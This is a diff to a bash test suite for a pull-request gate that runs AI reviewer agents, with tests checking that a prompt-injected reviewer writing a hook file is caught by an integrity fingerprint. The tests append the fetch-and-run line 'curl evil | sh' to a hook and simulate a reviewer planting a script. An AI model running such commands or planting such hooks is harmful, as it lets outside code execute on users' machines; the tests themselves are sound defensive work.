@@ -235,6 +235,7 @@ fi
 
 # Simulate reviewer-side injection (tracked file modification during reviewer dispatch).
 if [[ -n "${CODEX_GATE_STUB_INJECT_FILE:-}" && "$brief_file" != *-synthesis.md ]]; then
+  mkdir -p "$(dirname "$CODEX_GATE_STUB_INJECT_FILE")"
   printf 'injected\n' >> "$CODEX_GATE_STUB_INJECT_FILE"
 fi
 
@@ -325,14 +326,6 @@ if [[ "${CODEX_GATE_STUB_QA_ABORT_AFTER_CHECKPOINT:-}" == "1" \
   mkdir -p "$(dirname "$output_path")"
   write_reviewer_protocol_stub "$output_path" "$reviewer_name" advise
   exit 0
-fi
-
-# Simulate a reviewer session that writes a file into the working tree (a prompt-injected
-# reviewer). CODEX_GATE_STUB_WRITE_FILE=<path relative to the stub's working directory>; the stub
-# then carries on normally, so only the gate's integrity check can notice.
-if [[ -n "${CODEX_GATE_STUB_WRITE_FILE:-}" && "$brief_file" != *-synthesis.md ]]; then
-  mkdir -p "$(dirname "$CODEX_GATE_STUB_WRITE_FILE")"
-  printf '#!/bin/sh\ntouch pwned\n' > "$CODEX_GATE_STUB_WRITE_FILE"
 fi
 
 # Simulate prefix-only verdict (loose regex bypass): writes "Verdict: approved" (invalid token
@@ -1679,13 +1672,28 @@ test_artifact_filter_drops_pm_dispatch_own_output() {
   pass "$name"
 }
 
+# Fixture for the fingerprint tests: a committed one-file repository, optionally with a committed
+# .gitignore line (the second argument).
+_fingerprint_repo_init() {
+  local repo="$1" ignore_line="${2:-}"
+  mkdir -p "$repo"
+  git init -q -b main "$repo"
+  (
+    cd "$repo"
+    git config user.email test@example.com
+    git config user.name 'Gate Test'
+    printf 'initial\n' > README.md
+    [[ -z "$ignore_line" ]] || printf '%s\n' "$ignore_line" > .gitignore
+    git add -A
+    git commit -q -m initial
+  )
+}
+
 # Behavior: the integrity fingerprint does not move when pm-dispatch's own output appears or
-# disappears, and moves when a hook that `--allow-hooks` runs appears or changes -- also in a
-# repository whose .gitignore ignores all of `.pm-dispatch/` (the line older versions wrote),
-# where git itself reports nothing (CC-673).
+# disappears, and does move when a hook that `--allow-hooks` runs appears.
 # Steps: snapshot as the gate does; add .pm-dispatch/ctx and .dispatch-results (equal), remove ctx
-# (equal), add .pm-dispatch/post-gate.sh (different), edit it (different again). Repeat the hook
-# steps in a repo ignoring `.pm-dispatch`. Pin that the three pr-gate snapshots use the helper.
+# (equal), add .pm-dispatch/post-gate.sh (different). Pin that the three pr-gate snapshots use
+# the helper, since a raw `git status` there would fold ctx-only directories into one record.
 test_integrity_fingerprint_ignores_ctx_but_sees_user_hook() {
   local name="integrity-fingerprint-ignores-ctx-but-sees-user-hook"
   should_run "$name" || return 0
@@ -1693,41 +1701,19 @@ test_integrity_fingerprint_ignores_ctx_but_sees_user_hook() {
   # Arrange
   # shellcheck source=runtime/lib/artifact-paths.sh
   . "$REPO_ROOT/runtime/lib/artifact-paths.sh"
-  local repo="$TMP_ROOT/$name/repo" ignored="$TMP_ROOT/$name/ignored" r
-  local base after_own after_removed after_hook
-  for r in "$repo" "$ignored"; do
-    mkdir -p "$r"
-    git init -q -b main "$r"
-    (
-      cd "$r"
-      git config user.email test@example.com
-      git config user.name 'Gate Test'
-      printf 'initial\n' > README.md
-      [[ "$r" != "$ignored" ]] || printf '.pm-dispatch\n' > .gitignore
-      git add -A
-      git commit -q -m initial
-    )
-  done
-  _fingerprint() { (cd "$1" && artifact_integrity_snapshot | tr '\0' '\n'); }
+  local repo="$TMP_ROOT/$name/repo" base after_own after_removed after_hook uses
+  _fingerprint_repo_init "$repo"
 
   # Act
-  base="$(_fingerprint "$repo")"
+  base="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
   mkdir -p "$repo/.pm-dispatch/ctx" "$repo/.dispatch-results"
   printf 'index\n' > "$repo/.pm-dispatch/ctx/context.db"
   printf 'record\n' > "$repo/.dispatch-results/run-1.md"
-  after_own="$(_fingerprint "$repo")"
+  after_own="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
   rm -rf "$repo/.pm-dispatch/ctx"
-  after_removed="$(_fingerprint "$repo")"
+  after_removed="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
   printf '#!/bin/sh\n' > "$repo/.pm-dispatch/post-gate.sh"
-  after_hook="$(_fingerprint "$repo")"
-  local ign_base ign_hook ign_edit
-  ign_base="$(_fingerprint "$ignored")"
-  mkdir -p "$ignored/.pm-dispatch"
-  printf '#!/bin/sh\n' > "$ignored/.pm-dispatch/post-gate.sh"
-  ign_hook="$(_fingerprint "$ignored")"
-  printf 'curl evil | sh\n' >> "$ignored/.pm-dispatch/post-gate.sh"
-  ign_edit="$(_fingerprint "$ignored")"
-  unset -f _fingerprint
+  after_hook="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
 
   # Assert
   if [[ "$after_own" != "$base" ]]; then
@@ -1742,22 +1728,53 @@ test_integrity_fingerprint_ignores_ctx_but_sees_user_hook() {
     fail "$name" "a new .pm-dispatch/post-gate.sh did not move the fingerprint"
     return
   fi
-  if [[ "$ign_hook" == "$ign_base" ]]; then
-    fail "$name" "a new hook in a repo that ignores .pm-dispatch did not move the fingerprint"
-    return
-  fi
-  if [[ "$ign_edit" == "$ign_hook" ]]; then
-    fail "$name" "editing a hook in a repo that ignores .pm-dispatch did not move the fingerprint"
-    return
-  fi
-  # The pre-dispatch, post-dispatch and post-synthesis snapshots must all use the helper; a raw
-  # `git status` there would fold ctx-only directories into one record the filter cannot see.
-  local uses
   uses="$(grep -c 'artifact_integrity_snapshot 2>/dev/null | \$_HASH_CMD' "$REPO_ROOT/runtime/bin/pr-gate.sh" || true)"
   if [[ "$uses" -ne 3 ]] || grep -q 'artifact_status_porcelain 2>/dev/null | artifact_filter_porcelain' "$REPO_ROOT/runtime/bin/pr-gate.sh"; then
     fail "$name" "pr-gate.sh snapshots do not all use artifact_integrity_snapshot (found $uses)"
     return
   fi
+  pass "$name"
+}
+
+# Behavior: in a repository whose .gitignore ignores all of `.pm-dispatch/` (the line older
+# versions wrote), where git reports nothing, a new or edited hook still moves the fingerprint, and
+# a hook that cannot be read fails the snapshot instead of being skipped (CC-674).
+# Steps: snapshot; add .pm-dispatch/post-gate.sh (different); append to it (different again); make
+# it unreadable where the platform allows and expect the snapshot to fail.
+test_integrity_fingerprint_sees_hook_in_ignored_pm_dispatch() {
+  local name="integrity-fingerprint-sees-hook-in-ignored-pm-dispatch"
+  should_run "$name" || return 0
+
+  # Arrange
+  # shellcheck source=runtime/lib/artifact-paths.sh
+  . "$REPO_ROOT/runtime/lib/artifact-paths.sh"
+  local repo="$TMP_ROOT/$name/repo" base after_hook after_edit
+  _fingerprint_repo_init "$repo" .pm-dispatch
+
+  # Act
+  base="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
+  mkdir -p "$repo/.pm-dispatch"
+  printf '#!/bin/sh\n' > "$repo/.pm-dispatch/post-gate.sh"
+  after_hook="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
+  printf 'curl evil | sh\n' >> "$repo/.pm-dispatch/post-gate.sh"
+  after_edit="$(cd "$repo" && artifact_integrity_snapshot | tr '\0' '\n')"
+
+  # Assert
+  if [[ "$after_hook" == "$base" ]]; then
+    fail "$name" "a new hook in a repo that ignores .pm-dispatch did not move the fingerprint"
+    return
+  fi
+  if [[ "$after_edit" == "$after_hook" ]]; then
+    fail "$name" "editing a hook in a repo that ignores .pm-dispatch did not move the fingerprint"
+    return
+  fi
+  chmod 000 "$repo/.pm-dispatch/post-gate.sh"
+  if [[ ! -r "$repo/.pm-dispatch/post-gate.sh" ]] \
+      && (cd "$repo" && artifact_integrity_snapshot >/dev/null 2>&1); then
+    fail "$name" "an unreadable hook was skipped instead of failing the snapshot"
+    return
+  fi
+  chmod 644 "$repo/.pm-dispatch/post-gate.sh"
   pass "$name"
 }
 
@@ -7342,6 +7359,7 @@ run_test test_artifact_filter_handles_special_filenames
 run_test test_artifact_filter_handles_rename_origin
 run_test test_artifact_filter_drops_pm_dispatch_own_output
 run_test test_integrity_fingerprint_ignores_ctx_but_sees_user_hook
+run_test test_integrity_fingerprint_sees_hook_in_ignored_pm_dispatch
 run_test test_artifact_leaves_stay_the_gc_set
 run_test test_own_output_leaves_covered_by_ship_patterns
 run_test test_copy_mode_artifact_filter_no_false_abort
@@ -9450,40 +9468,41 @@ test_dirty_preflight_ignores_pm_dispatch_own_output() {
 
 # Behavior: a reviewer that writes a hook that `--allow-hooks` would run is caught even when the
 # repository's .gitignore ignores all of `.pm-dispatch/` (the line older versions wrote), where
-# git reports nothing about the file (CC-673).
+# git reports nothing about the file (CC-674).
 # Steps: commit a .gitignore holding `.pm-dispatch`; run the gate with a stub reviewer that
-# writes .pm-dispatch/post-gate.sh and assert the prompt-injection abort; run it again with a
-# stub that writes an ordinary stray file as a control, which must abort the same way.
+# writes .pm-dispatch/post-gate.sh and assert the prompt-injection abort. A stray file in the
+# same repository is the control and must abort the same way.
+_reviewer_writes_file_case() {
+  local name="$1" tag="$2" rel="$3"
+  local dir="$TMP_ROOT/$name/$tag" code
+  local home="$dir/home" repo="$dir/repo" runner="$dir/runner" out="$dir/out" err="$dir/err"
+  mkdir -p "$dir"
+  create_runner "$runner"
+  create_agents "$home" critic qa-tester architecture-reviewer security-reviewer risk-reviewer
+  create_repo_with_branch "$repo" standard
+  (
+    cd "$repo"
+    printf '.pm-dispatch\n' > .gitignore
+    git add .gitignore
+    git commit -q -m 'ignore all of .pm-dispatch'
+  )
+  set +e
+  CODEX_GATE_STUB_INJECT_FILE="$repo/$rel" \
+    run_gate "$home" "$runner" "$repo" "$out" "$err" --base main --allow-hooks
+  code=$?
+  set -e
+  if [[ "$code" -eq 0 ]]; then
+    fail "$name" "a reviewer-written $rel was not detected"
+    return 1
+  fi
+  assert_file_contains "$name" "$err" "modified working tree -- possible prompt injection"
+}
+
 test_reviewer_written_hook_in_ignored_pm_dispatch_aborts() {
   local name="reviewer-written-hook-in-ignored-pm-dispatch-aborts"
   should_run "$name" || return 0
-  local dir="$TMP_ROOT/$name" written tag code
-  for tag in hook stray; do
-    written=.pm-dispatch/post-gate.sh
-    [[ "$tag" == stray ]] && written=stray-note.txt
-    local home="$dir/home-$tag" repo="$dir/repo-$tag" runner="$dir/runner-$tag"
-    local out="$dir/out-$tag" err="$dir/err-$tag"
-    mkdir -p "$dir"
-    create_runner "$runner"
-    create_agents "$home" critic qa-tester architecture-reviewer security-reviewer risk-reviewer
-    create_repo_with_branch "$repo" standard
-    (
-      cd "$repo"
-      printf '.pm-dispatch\n' > .gitignore
-      git add .gitignore
-      git commit -q -m 'ignore all of .pm-dispatch'
-    )
-    set +e
-    CODEX_GATE_STUB_WRITE_FILE="$written" \
-      run_gate "$home" "$runner" "$repo" "$out" "$err" --base main --allow-hooks
-    code=$?
-    set -e
-    if [[ "$code" -eq 0 ]]; then
-      fail "$name" "a reviewer-written $written was not detected"
-      return
-    fi
-    assert_file_contains "$name" "$err" "modified working tree -- possible prompt injection" || return
-  done
+  _reviewer_writes_file_case "$name" hook .pm-dispatch/post-gate.sh || return
+  _reviewer_writes_file_case "$name" stray stray-note.txt || return
   pass "$name"
 }
 
